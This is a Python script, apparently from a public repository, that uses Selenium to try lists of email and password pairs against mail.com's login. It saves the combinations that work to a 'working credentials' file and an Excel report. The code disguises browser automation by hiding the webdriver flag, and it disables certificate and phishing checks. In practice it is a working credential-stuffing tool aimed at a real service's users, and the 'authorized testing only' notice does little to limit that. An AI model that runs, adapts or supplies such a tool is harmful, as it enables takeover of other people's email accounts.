"""
🔐 Credential Tester for Mail.com - Main Application

This is the core application for automated login testing on mail.com.
It provides both command-line and GUI interfaces for testing email/password combinations.

📋 Features:
- Automated login testing using Selenium WebDriver
- Real-time result saving to prevent data loss
- Multiple detection methods for login success/failure
- Cross-platform support (Windows, macOS, Linux)
- Comprehensive error handling and logging
- Excel report generation for detailed analysis

⚠️  SECURITY NOTICE:
This tool is for educational and authorized testing purposes only.
Only use on systems you own or have explicit permission to test.

Author: Houssam-C-H
GitHub: https://github.com/Houssam-C-H/credential-tester-mail.com
License: MIT
"""

# =============================================================================
# IMPORTS AND DEPENDENCIES
# =============================================================================

import os
import time
import uuid
import tempfile
import shutil
import glob
from datetime import datetime

# Third-party libraries for web automation and data processing
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# =============================================================================
# CONFIGURATION CONSTANTS
# =============================================================================

# Target website for login testing
LOGIN_URL = "https://www.mail.com/"

# File paths for input and output
CREDENTIALS_FILE = "credentials.txt"        # Input file with email,password format
OUTPUT_FILE = "login_results.xlsx"         # Excel report with detailed results
WORKING_FILE = "working_credentials.txt"    # Successful logins
NOT_WORKING_FILE = "not_working.txt"       # Failed logins

# Timing configuration
WAIT_TIMEOUT = 15  # Maximum wait time for elements to appear (seconds)

# =============================================================================
# LOGIN DETECTION CONSTANTS
# =============================================================================

# XPath selectors for detecting login errors (indicates failed login)
ERROR_XPATHS = [
    "//div[contains(text(), 'PLEASE TRY AGAIN')]",           # Generic retry message
    "//div[contains(text(), 'invalid email address')]",      # Invalid email error
    "//div[contains(text(), 'invalid password')]",           # Invalid password error
    "//div[contains(text(), 'Invalid')]",                    # Generic invalid error
    "//div[contains(text(), 'Error')]",                      # Generic error message
    "//div[contains(text(), 'Failed')]",                     # Failed login message
    "//div[contains(text(), 'Incorrect')]",                  # Incorrect credentials
    "//div[contains(text(), 'Wrong')]",                      # Wrong credentials
    "//div[contains(text(), 'try again')]",                  # Retry message
    "//span[contains(text(), 'PLEASE TRY AGAIN')]",          # Span element retry
    "//p[contains(text(), 'PLEASE TRY AGAIN')]",             # Paragraph retry
    "//div[contains(text(), 'email address / password')]",   # Credential error
    "//span[contains(text(), 'email address / password')]", # Span credential error
    "//p[contains(text(), 'email address / password')]"     # Paragraph credential error
]

# URL keywords that indicate successful login
SUCCESS_URL_KEYWORDS = [
    "dashboard",    # User dashboard
    "success",      # Success page
    "inbox",        # Email inbox
    "mailbox",      # Mailbox page
    "account",      # Account page
    "navigator",    # Navigation page
    "/mail"         # Mail section
]

# URL keywords that indicate failed login (still on login page)
FAILURE_URL_KEYWORDS = [
    "login",        # Login page
    "signin",       # Sign-in page
    "logout"        # Logout page
]

# XPath selectors for detecting successful login elements
SUCCESS_XPATHS = [
    "//div[contains(text(), 'Welcome')]",        # Welcome message
    "//div[contains(text(), 'Success')]",          # Success message
    "//h1[contains(text(), 'Dashboard')]",         # Dashboard heading
    "//div[@class='success-message']",            # Success message class
    "//div[contains(text(), 'Inbox')]",            # Inbox indicator
    "//div[contains(text(), 'Mailbox')]",          # Mailbox indicator
    "//a[contains(text(), 'Compose')]",            # Compose email button
    "//a[contains(text(), 'New Message')]",       # New message button
    "//div[contains(text(), 'Logout')]",           # Logout option
    "//a[contains(text(), 'Logout')]",             # Logout link
    "//button[contains(text(), 'Logout')]"         # Logout button
]

# Text phrases that indicate login errors (case-insensitive)
ERROR_PHRASES = [
    "please try again",
    "invalid email",
    "invalid password",
    "wrong password",
    "incorrect password",
    "email address / password",
    "try again"
]

# XPath selectors for finding login buttons to open dropdown
LOGIN_BUTTON_XPATHS = [
    "//a[@id='login-button']",                    # Login button by ID
    "//a[contains(@class, 'button-login')]",      # Login button by class
    "//a[@aria-label='Log in']",                  # Login button by aria-label
    "//a[contains(text(), 'Log in')]",            # Login button by text
    "//a[contains(text(), 'Login')]",             # Login button by text
    "//button[contains(text(), 'Login')]",        # Login button element
    "//a[contains(text(), 'Sign In')]",           # Sign in button
    "//button[contains(text(), 'Sign In')]",      # Sign in button element
    "//a[contains(text(), 'Log In')]",            # Log in button
    "//button[contains(text(), 'Log In')]",       # Log in button element
    "//a[@href*='login']",                        # Login link by href
    "//a[@href*='signin']",                       # Signin link by href
    "//a[contains(@class, 'login')]",             # Login link by class
    "//button[contains(@class, 'login')]",       # Login button by class
    "//a[contains(@id, 'login')]",                # Login link by ID
    "//button[contains(@id, 'login')]"           # Login button by ID
]

# =============================================================================
# ELEMENT SELECTORS
# =============================================================================

# Multiple selectors for email input field (tries each until one works)
EMAIL_SELECTORS = [
    (By.NAME, "email"),                           # Email field by name
    (By.NAME, "username"),                        # Username field by name
    (By.NAME, "user"),                            # User field by name
    (By.ID, "email"),                             # Email field by ID
    (By.ID, "username"),                          # Username field by ID
    (By.ID, "user"),                              # User field by ID
    (By.XPATH, "//input[@type='email']"),         # Email input by type
    (By.XPATH, "//input[contains(@placeholder, 'Email')]"),  # Email by placeholder
    (By.XPATH, "//input[contains(@placeholder, 'Username')]"), # Username by placeholder
    (By.XPATH, "//input[@name='email']"),         # Email by name attribute
    (By.XPATH, "//input[@name='username']"),      # Username by name attribute
    (By.XPATH, "//input[@name='user']"),          # User by name attribute
    (By.XPATH, "//div[contains(@class, 'login')]//input[@type='email']"),  # Email in login div
    (By.XPATH, "//div[contains(@class, 'login')]//input[@type='text']"),  # Text input in login div
    (By.XPATH, "//form//input[@type='email']"),   # Email in form
    (By.XPATH, "//form//input[@type='text']")     # Text input in form
]

# Multiple selectors for password input field
PASSWORD_SELECTORS = [
    (By.NAME, "password"),                         # Password field by name
    (By.NAME, "pass"),                             # Pass field by name
    (By.ID, "password"),                           # Password field by ID
    (By.ID, "pass"),                               # Pass field by ID
    (By.XPATH, "//input[@type='password']"),       # Password input by type
    (By.XPATH, "//input[contains(@placeholder, 'Password')]"),  # Password by placeholder
    (By.XPATH, "//input[@name='password']"),      # Password by name attribute
    (By.XPATH, "//input[@name='pass']"),          # Pass by name attribute
    (By.XPATH, "//div[contains(@class, 'login')]//input[@type='password']"),  # Password in login div
    (By.XPATH, "//form//input[@type='password']")  # Password in form
]

# Multiple selectors for submit/login button
SUBMIT_BUTTON_XPATHS = [
    "//button[@type='submit']",                   # Submit button by type
    "//button[contains(text(), 'Login')]",       # Login button by text
    "//button[contains(text(), 'Sign In')]",      # Sign in button by text
    "//button[contains(text(), 'Log In')]",       # Log in button by text
    "//input[@type='submit']",                    # Submit input by type
    "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]",  # Case-insensitive login
    "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign')]",   # Case-insensitive sign
    "//div[contains(@class, 'login')]//button[@type='submit']",  # Submit in login div
    "//div[contains(@class, 'login')]//button[contains(text(), 'Login')]",  # Login in login div
    "//form//button[@type='submit']",             # Submit in form
    "//form//button[contains(text(), 'Login')]"   # Login in form
]

# =============================================================================
# CORE FUNCTIONS
# =============================================================================

def setup_driver():
    """
    Setup and return a configured Chrome WebDriver with SSL support.
    
    This function tries multiple approaches to create a working WebDriver:
    1. Minimal Chrome options with unique profile
    2. ChromeDriverManager with path correction
    3. Headless Chrome with aggressive optimizations
    4. Firefox as last resort
    
    Returns:
        WebDriver: Configured Chrome WebDriver instance
        
    Raises:
        Exception: If all WebDriver approaches fail
    """
    print("🔧 Setting up WebDriver...")
    
    # Try multiple approaches to get a working Chrome driver
    driver = None
    
    # Approach 1: Try with minimal options and unique user data directory
    try:
        print("  📋 Trying minimal Chrome options with unique profile...")
        import uuid
        unique_id = str(uuid.uuid4())[:8]
        minimal_options = webdriver.ChromeOptions()
        minimal_options.add_argument("--no-sandbox")
        minimal_options.add_argument("--disable-dev-shm-usage")
        minimal_options.add_argument("--disable-gpu")
        minimal_options.add_argument("--disable-extensions")
        minimal_options.add_argument("--disable-plugins")
        minimal_options.add_argument(f"--user-data-dir=./chrome_temp_{unique_id}")
        minimal_options.add_argument(f"--profile-directory=profile_{unique_id}")
        
        # Create driver with timeout protection
        driver = webdriver.Chrome(options=minimal_options)
        print("  ✅ Minimal options approach successful!")
        
    except Exception as e:
        print(f"  ❌ Minimal options failed: {e}")
        
        # Approach 2: Try ChromeDriverManager with path correction
        try:
            print("  📋 Trying ChromeDriverManager...")
            driver_path = ChromeDriverManager().install()
            print(f"  📁 ChromeDriver path: {driver_path}")
            
            # Fix the path if it points to wrong file
            if "THIRD_PARTY_NOTICES" in driver_path:
                driver_dir = os.path.dirname(driver_path)
                # Look for chromedriver.exe in the directory
                actual_driver = os.path.join(driver_dir, "chromedriver.exe")
                if os.path.exists(actual_driver):
                    driver_path = actual_driver
                    print(f"  🔧 Fixed driver path: {driver_path}")
                else:
                    # Try parent directory
                    parent_dir = os.path.dirname(driver_dir)
                    actual_driver = os.path.join(parent_dir, "chromedriver.exe")
                    if os.path.exists(actual_driver):
                        driver_path = actual_driver
                        print(f"  📁 Found chromedriver.exe in parent directory: {driver_path}")
                    else:
                        raise Exception("Could not find valid chromedriver.exe")
            
            # Create unique temp directory for this approach too
            unique_id = str(uuid.uuid4())[:8]
            temp_dir = os.path.join(tempfile.gettempdir(), f"chrome_manager_{unique_id}")
            os.makedirs(temp_dir, exist_ok=True)
            
            # Add unique user data directory to avoid conflicts
            options = webdriver.ChromeOptions()
            options.add_argument(f"--user-data-dir={temp_dir}")
            options.add_argument(f"--profile-directory=profile_{unique_id}")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            
            service = Service(driver_path)
            driver = webdriver.Chrome(service=service, options=options)
            print("  ✅ ChromeDriverManager approach successful!")
            
        except Exception as e2:
            print(f"  ❌ ChromeDriverManager failed: {e2}")
            
            # Approach 3: Try with headless mode and aggressive optimizations
            try:
                print("  📋 Trying headless Chrome with aggressive optimizations...")
                import tempfile
                import os
                
                # Create unique temp directory
                unique_id = str(uuid.uuid4())[:8]
                temp_dir = os.path.join(tempfile.gettempdir(), f"chrome_headless_{unique_id}")
                os.makedirs(temp_dir, exist_ok=True)
                
                headless_options = webdriver.ChromeOptions()
                headless_options.add_argument("--headless=new")
                headless_options.add_argument("--no-sandbox")
                headless_options.add_argument("--disable-dev-shm-usage")
                headless_options.add_argument("--disable-gpu")
                headless_options.add_argument("--disable-extensions")
                headless_options.add_argument("--disable-plugins")
                headless_options.add_argument("--disable-images")
                headless_options.add_argument("--disable-javascript")
                headless_options.add_argument("--disable-default-apps")
                headless_options.add_argument("--disable-sync")
                headless_options.add_argument("--disable-background-timer-throttling")
                headless_options.add_argument("--disable-backgrounding-occluded-windows")
                headless_options.add_argument("--disable-renderer-backgrounding")
                headless_options.add_argument("--disable-features=TranslateUI")
                headless_options.add_argument("--disable-ipc-flooding-protection")
                headless_options.add_argument("--remote-debugging-port=0")
                headless_options.add_argument("--disable-web-security")
                headless_options.add_argument("--allow-running-insecure-content")
                headless_options.add_argument("--ignore-certificate-errors")
                headless_options.add_argument("--ignore-ssl-errors")
                headless_options.add_argument(f"--user-data-dir={temp_dir}")
                headless_options.add_argument(f"--profile-directory=profile_{unique_id}")
                headless_options.add_argument("--disable-logging")
                headless_options.add_argument("--silent")
                headless_options.add_argument("--log-level=3")
                headless_options.add_argument("--disable-hang-monitor")
                headless_options.add_argument("--disable-prompt-on-repost")
                headless_options.add_argument("--disable-client-side-phishing-detection")
                headless_options.add_argument("--disable-component-update")
                headless_options.add_argument("--disable-domain-reliability")
                headless_options.add_argument("--disable-features=VizDisplayCompositor")
                headless_options.add_argument("--force-color-profile=srgb")
                headless_options.add_argument("--metrics-recording-only")
                headless_options.add_argument("--no-default-browser-check")
                headless_options.add_argument("--no-first-run")
                headless_options.add_argument("--password-store=basic")
                headless_options.add_argument("--use-mock-keychain")
                
                driver = webdriver.Chrome(options=headless_options)
                print("  ✅ Headless Chrome approach successful!")
                
                # Test navigation immediately to ensure it's working
                print("  🧪 Testing navigation to mail.com...")
                driver.get("https://www.mail.com/")
                print(f"  ✅ Successfully navigated to: {driver.current_url}")
                print(f"  📄 Page title: {driver.title}")
                
            except Exception as e3:
                print(f"  ❌ Headless Chrome failed: {e3}")
                
                # Approach 4: Try with minimal Firefox as last resort
                try:
                    print("  📋 Trying Firefox as last resort...")
                    from selenium.webdriver.firefox.options import Options as FirefoxOptions
                    from selenium.webdriver.firefox.service import Service as FirefoxService
                    from webdriver_manager.firefox import GeckoDriverManager
                    
                    firefox_options = FirefoxOptions()
                    firefox_options.add_argument("--headless")
                    firefox_options.add_argument("--no-sandbox")
                    firefox_options.add_argument("--disable-dev-shm-usage")
                    
                    service = FirefoxService(GeckoDriverManager().install())
                    driver = webdriver.Firefox(service=service, options=firefox_options)
                    print("  ✅ Firefox approach successful!")
                    
                    # Test navigation immediately
                    print("  🧪 Testing navigation to mail.com...")
                    driver.get("https://www.mail.com/")
                    print(f"  ✅ Successfully navigated to: {driver.current_url}")
                    print(f"  📄 Page title: {driver.title}")
                    
                except Exception as e4:
                    print(f"  ❌ Firefox also failed: {e4}")
                    raise Exception("All WebDriver approaches failed")
                
            except Exception as e3:
                print(f"  ❌ All Chrome driver approaches failed!")
                print(f"  📋 Minimal options error: {e}")
                print(f"  📋 ChromeDriverManager error: {e2}")
                print(f"  📋 Headless Chrome error: {e3}")
                raise Exception("WebDriver setup failed - all approaches exhausted")
    
    # Execute script to hide automation
    try:
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.implicitly_wait(5)
        print("  ✅ WebDriver configured successfully!")
    except Exception as e:
        print(f"  ⚠️  Warning: Could not configure WebDriver properties: {e}")
    
    return driver

def check_login_success(driver, wait):
    """
    Check if login was successful based on URL or page elements.
    
    This function uses multiple detection methods:
    1. Check for error messages (failure indicators)
    2. Check URL for success keywords
    3. Check for success elements on page
    4. Check if login form is still visible
    5. Check page source for error phrases
    
    Args:
        driver: Selenium WebDriver instance
        wait: WebDriverWait instance
        
    Returns:
        bool: True if login appears successful, False otherwise
    """
    try:
        print("  🔍 Checking login success...")

        # Method 1: Check for error messages FIRST (indicates failure)
        for xpath in ERROR_XPATHS:
            try:
                element = driver.find_element(By.XPATH, xpath)
                print(f"  ❌ Error detected: {xpath}")
                return False
            except NoSuchElementException:
                continue

        # Method 2: Check URL for dashboard or success indicator
        current_url = driver.current_url.lower()
        print(f"  🌐 Current URL: {current_url}")

        # Check if we're still on login page or error page
        if any(keyword in current_url for keyword in FAILURE_URL_KEYWORDS):
            print("  ❌ Still on login/logout page - likely failed")
            return False

        if any(keyword in current_url for keyword in SUCCESS_URL_KEYWORDS):
            print("  ✅ Success detected by URL change")
            return True

        # Method 3: Check for success message on page
        for xpath in SUCCESS_XPATHS:
            try:
                element = driver.find_element(By.XPATH, xpath)
                print(f"  ✅ Success detected by element: {xpath}")
                return True
            except NoSuchElementException:
                continue

        # Method 4: Check if login form is still visible (indicates failure)
        try:
            login_form = driver.find_element(By.XPATH, "//input[@type='password']")
            print("  ❌ Login form still visible - likely failed")
            return False
        except NoSuchElementException:
            print("  🔍 Login form no longer visible - checking further...")

        # Method 5: Check page source for error messages
        page_source = driver.page_source.lower()
        for phrase in ERROR_PHRASES:
            if phrase in page_source:
                print(f"  ❌ Error phrase found in page source: {phrase}")
                return False

        # If we can't determine, assume failure to be safe
        print("  ⚠️  Could not determine success - assuming failure")
        return False

    except Exception as e:
        print(f"  ❌ Error checking login success: {e}")
        return False

def open_login_dropdown(driver, wait):
    """
    Open the login dropdown menu by clicking the login button.
    
    This function attempts to find and click a login button using multiple XPath selectors.
    It waits for the button to be clickable before attempting to click.
    
    Args:
        driver: Selenium WebDriver instance
        wait: WebDriverWait instance
        
    Returns:
        bool: True if login button was found and clicked, False otherwise
    """
    try:
        print("  🔍 Looking for login button to open dropdown...")

        for xpath in LOGIN_BUTTON_XPATHS:
            try:
                login_button = wait.until(EC.element_to_be_clickable((By.XPATH, xpath)))
                login_button.click()
                print(f"  ✅ Clicked login button: {xpath}")
                time.sleep(3)  # Wait longer for dropdown to appear
                return True
            except TimeoutException:
                continue

        print("  ❌ Could not find login button")
        return False

    except Exception as e:
        print(f"  ❌ Error opening login dropdown: {e}")
        return False

def find_login_elements(driver, wait):
    """
    Find email and password fields in the login form.
    
    This function attempts to locate email and password input fields using multiple selector strategies.
    It waits for elements to be present before returning them.
    
    Args:
        driver: Selenium WebDriver instance
        wait: WebDriverWait instance
        
    Returns:
        tuple: (email_field, password_field) where each may be None if not found
    """
    email_field = None
    password_field = None

    # Wait for dropdown to be visible
    time.sleep(2)

    # Try multiple selectors for email field
    for selector_type, selector_value in EMAIL_SELECTORS:
        try:
            email_field = wait.until(EC.presence_of_element_located((selector_type, selector_value)))
            print(f"  ✅ Found email field with: {selector_type} = {selector_value}")
            break
        except TimeoutException:
            continue

    # Try multiple selectors for password field
    for selector_type, selector_value in PASSWORD_SELECTORS:
        try:
            password_field = wait.until(EC.presence_of_element_located((selector_type, selector_value)))
            print(f"  ✅ Found password field with: {selector_type} = {selector_value}")
            break
        except TimeoutException:
            continue

    return email_field, password_field

def test_login(driver, email, password, wait):
    """
    Test login with given credentials.
    
    This function performs the complete login test process:
    1. Navigate to mail.com
    2. Open login dropdown
    3. Find login form elements
    4. Fill in credentials
    5. Submit form
    6. Check for success/failure
    
    Args:
        driver: Selenium WebDriver instance
        email: User's email address
        password: User's password
        wait: WebDriverWait instance
        
    Returns:
        dict: Test result with email, password, status, and timestamp
    """
    try:
        print(f"🧪 Testing login for: {email}")
        
        # Navigate to main mail.com page with timeout
        print("  🌐 Navigating to mail.com...")
        driver.set_page_load_timeout(30)  # 30 second timeout for page load
        driver.get(LOGIN_URL)
        print(f"  ✅ Successfully loaded: {driver.current_url}")
        print(f"  📄 Page title: {driver.title}")
        
        # Wait for page to fully load
        time.sleep(5)
        
        # Open the login dropdown
        if not open_login_dropdown(driver, wait):
            return {
                "Email": email,
                "Password": password,
                "Status": "ERROR: Could not open login dropdown",
                "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        # Find login form elements in the dropdown
        email_field, password_field = find_login_elements(driver, wait)
        
        if not email_field or not password_field:
            return {
                "Email": email,
                "Password": password,
                "Status": "ERROR: Could not find login form elements in dropdown",
                "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        # Fill in credentials
        print("  📝 Filling in credentials...")
        email_field.clear()
        email_field.send_keys(email)
        time.sleep(1)
        
        password_field.clear()
        password_field.send_keys(password)
        time.sleep(1)
        
        # Submit form (try multiple methods)
        submitted = False
        
        # Method 1: Press Enter on password field
        try:
            password_field.send_keys(Keys.RETURN)
            submitted = True
            print("  ✅ Submitted using Enter key")
        except:
            pass
        
        # Method 2: Find and click login button in dropdown
        if not submitted:
            for xpath in SUBMIT_BUTTON_XPATHS:
                try:
                    login_button = driver.find_element(By.XPATH, xpath)
                    login_button.click()
                    submitted = True
                    print(f"  ✅ Submitted using button: {xpath}")
                    break
                except:
                    continue
        
        # Method 3: Find any button in the dropdown and click
        if not submitted:
            try:
                buttons = driver.find_elements(By.TAG_NAME, "button")
                if buttons:
                    buttons[0].click()
                    submitted = True
                    print("  ✅ Submitted using first button found")
            except:
                pass
        
        if not submitted:
            return {
                "Email": email,
                "Password": password,
                "Status": "ERROR: Could not submit login form",
                "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        # Wait for page to load
        print("  ⏳ Waiting for login to process...")
        time.sleep(8)  # Increased wait time
        
        # Check if login was successful
        success = check_login_success(driver, wait)
        
        status = "SUCCESS" if success else "FAILED"
        print(f"  📊 Result: {status}")
        
        return {
            "Email": email,
            "Password": password,
            "Status": status,
            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return {
            "Email": email,
            "Password": password,
            "Status": f"ERROR: {str(e)}",
            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

def save_single_result(result):
    """
    Save a single result immediately to the appropriate file.
    
    This function saves results immediately to prevent data loss in case of crashes.
    It formats the result as: email,password,status
    
    Args:
        result: Dictionary containing test result
    """
    try:
        email = result["Email"]
        password = result["Password"]
        status = result["Status"]
        
        # Format: mail,pass,loggedin
        line = f"{email},{password},{status}"
        
        if status == "SUCCESS":
            # Append to working credentials file
            with open(WORKING_FILE, "a", encoding='utf-8') as f:
                f.write(line + "\n")
            print(f"  ✅ SUCCESS saved immediately to {WORKING_FILE}")
        else:
            # Append to non-working credentials file
            with open(NOT_WORKING_FILE, "a", encoding='utf-8') as f:
                f.write(line + "\n")
            print(f"  ❌ FAILED saved immediately to {NOT_WORKING_FILE}")
            
    except Exception as e:
        print(f"  ❌ Error saving result: {e}")

def initialize_result_files():
    """
    Initialize result files with headers if they don't exist.
    
    This function creates the output files with proper headers if they don't exist.
    It ensures the files are ready for writing results.
    """
    try:
        # Initialize working credentials file
        if not os.path.exists(WORKING_FILE):
            with open(WORKING_FILE, "w", encoding='utf-8') as f:
                f.write("mail,pass,loggedin\n")
            print(f"📁 Created new {WORKING_FILE}")
        else:
            print(f"📁 Using existing {WORKING_FILE}")
        
        # Initialize non-working credentials file
        if not os.path.exists(NOT_WORKING_FILE):
            with open(NOT_WORKING_FILE, "w", encoding='utf-8') as f:
                f.write("mail,pass,loggedin\n")
            print(f"📁 Created new {NOT_WORKING_FILE}")
        else:
            print(f"📁 Using existing {NOT_WORKING_FILE}")
            
    except Exception as e:
        print(f"❌ Error initializing result files: {e}")

def load_existing_results():
    """
    Load existing results from files to avoid retesting.
    
    This function reads existing results from the output files to avoid
    retesting credentials that have already been tested.
    
    Returns:
        tuple: (existing_results, tested_emails) where existing_results is a list
               of result dictionaries and tested_emails is a set of email addresses
    """
    existing_results = []
    tested_emails = set()
    
    try:
        # Load from working credentials
        if os.path.exists(WORKING_FILE):
            with open(WORKING_FILE, "r", encoding='utf-8') as f:
                lines = f.readlines()
                for line in lines[1:]:  # Skip header
                    line = line.strip()
                    if line and ',' in line:
                        parts = line.split(',')
                        if len(parts) >= 2:
                            email = parts[0].strip()
                            password = parts[1].strip()
                            status = parts[2].strip() if len(parts) > 2 else "SUCCESS"
                            existing_results.append({
                                "Email": email,
                                "Password": password,
                                "Status": status,
                                "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            })
                            tested_emails.add(email)
        
        # Load from non-working credentials
        if os.path.exists(NOT_WORKING_FILE):
            with open(NOT_WORKING_FILE, "r", encoding='utf-8') as f:
                lines = f.readlines()
                for line in lines[1:]:  # Skip header
                    line = line.strip()
                    if line and ',' in line:
                        parts = line.split(',')
                        if len(parts) >= 2:
                            email = parts[0].strip()
                            password = parts[1].strip()
                            status = parts[2].strip() if len(parts) > 2 else "FAILED"
                            if email not in tested_emails:  # Avoid duplicates
                                existing_results.append({
                                    "Email": email,
                                    "Password": password,
                                    "Status": status,
                                    "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                })
                                tested_emails.add(email)
        
        if existing_results:
            print(f"📊 Loaded {len(existing_results)} existing results")
            print(f"📧 Already tested emails: {len(tested_emails)}")
        
        return existing_results, tested_emails
        
    except Exception as e:
        print(f"❌ Error loading existing results: {e}")
        return [], set()

def save_results_to_files(results):
    """
    Save results to separate files for working and non-working credentials.
    
    This function organizes all results into separate files for easy analysis.
    
    Args:
        results: List of result dictionaries
    """
    working_credentials = []
    not_working_credentials = []
    
    for result in results:
        email = result["Email"]
        password = result["Password"]
        status = result["Status"]
        
        # Format: mail,pass,loggedin
        line = f"{email},{password},{status}"
        
        if status == "SUCCESS":
            working_credentials.append(line)
        else:
            not_working_credentials.append(line)
    
    # Save working credentials
    with open(WORKING_FILE, "w", encoding='utf-8') as f:
        f.write("mail,pass,loggedin\n")  # Header
        for line in working_credentials:
            f.write(line + "\n")
    
    # Save non-working credentials
    with open(NOT_WORKING_FILE, "w", encoding='utf-8') as f:
        f.write("mail,pass,loggedin\n")  # Header
        for line in not_working_credentials:
            f.write(line + "\n")
    
    print(f"💾 Working credentials saved to: {WORKING_FILE}")
    print(f"💾 Non-working credentials saved to: {NOT_WORKING_FILE}")

def main():
    """
    Main function to run the login automation.
    
    This function orchestrates the entire login testing process:
    1. Check for credentials file
    2. Initialize result files
    3. Load existing results
    4. Test each credential
    5. Save results immediately
    6. Generate Excel report
    7. Print summary
    """
    print("🔐 Login Automation Tool")
    print("=" * 50)
    print(f"🎯 Target URL: {LOGIN_URL}")
    print(f"📁 Credentials file: {CREDENTIALS_FILE}")
    print(f"✅ Working credentials will be saved to: {WORKING_FILE}")
    print(f"❌ Non-working credentials will be saved to: {NOT_WORKING_FILE}")
    print("=" * 50)
    
    # Check if credentials file exists
    if not os.path.exists(CREDENTIALS_FILE):
        print(f"❌ Error: {CREDENTIALS_FILE} not found!")
        print("📝 Please create a credentials.txt file with format: email,password")
        return
    
    # Initialize result files
    initialize_result_files()
    
    # Load existing results to avoid retesting
    existing_results, tested_emails = load_existing_results()
    results = existing_results.copy()
    
    try:
        # Read credentials and test each one
        with open(CREDENTIALS_FILE, "r", encoding='utf-8') as file:
            for line_num, line in enumerate(file, 1):
                line = line.strip()
                if not line or line.startswith("#"):  # Skip empty lines and comments
                    continue
                
                try:
                    email, password = line.split(",", 1)
                    email = email.strip()
                    password = password.strip()
                    
                    # Skip if already tested
                    if email in tested_emails:
                        print(f"\n⏭️  Skipping already tested account {line_num}: {email}")
                        continue
                    
                    # Setup driver for each test
                    print(f"\n🧪 Testing account {line_num}")
                    try:
                        driver = setup_driver()
                        wait = WebDriverWait(driver, WAIT_TIMEOUT)
                    except Exception as e:
                        print(f"❌ Error setting up WebDriver: {e}")
                        result = {
                            "Email": email,
                            "Password": password,
                            "Status": f"ERROR: WebDriver setup failed - {e}",
                            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        results.append(result)
                        # Save immediately
                        save_single_result(result)
                        continue
                    
                    # Test the login
                    result = test_login(driver, email, password, wait)
                    results.append(result)
                    
                    # Save result immediately after each test
                    save_single_result(result)
                    
                    # Close driver after each test
                    try:
                        driver.quit()
                        print("  🔒 Browser closed.")
                        
                        # Clean up temporary Chrome directories
                        try:
                            import shutil
                            import tempfile
                            import glob
                            temp_pattern = os.path.join(tempfile.gettempdir(), "chrome_temp_*")
                            for temp_dir in glob.glob(temp_pattern):
                                shutil.rmtree(temp_dir, ignore_errors=True)
                            print("  🧹 Temporary directories cleaned up.")
                        except:
                            pass
                    except:
                        pass
                    
                    # Small delay between tests
                    time.sleep(2)
                    
                except ValueError:
                    print(f"❌ Error on line {line_num}: Invalid format. Expected 'email,password'")
                    result = {
                        "Email": f"Line {line_num}",
                        "Password": "Invalid format",
                        "Status": "ERROR: Invalid format",
                        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    results.append(result)
                    # Save immediately
                    save_single_result(result)
        
        # Also save to Excel for detailed analysis
        print("\n📊 Generating Excel report...")
        df = pd.DataFrame(results)
        df.to_excel(OUTPUT_FILE, index=False)
        
        # Print summary
        total_tests = len(results)
        successful = len([r for r in results if r["Status"] == "SUCCESS"])
        failed = len([r for r in results if r["Status"] == "FAILED"])
        errors = len([r for r in results if "ERROR" in r["Status"]])
        
        print("\n" + "=" * 50)
        print("📊 SUMMARY:")
        print(f"📋 Total tests: {total_tests}")
        print(f"✅ Successful logins: {successful}")
        print(f"❌ Failed logins: {failed}")
        print(f"⚠️  Errors: {errors}")
        print(f"📄 Detailed results saved to: {OUTPUT_FILE}")
        
    except Exception as e:
        print(f"❌ Error during testing: {e}")
        print("💾 Results saved so far are preserved in the output files.")
    
    print("\n🎉 All tests completed.")

if __name__ == "__main__":
    main()
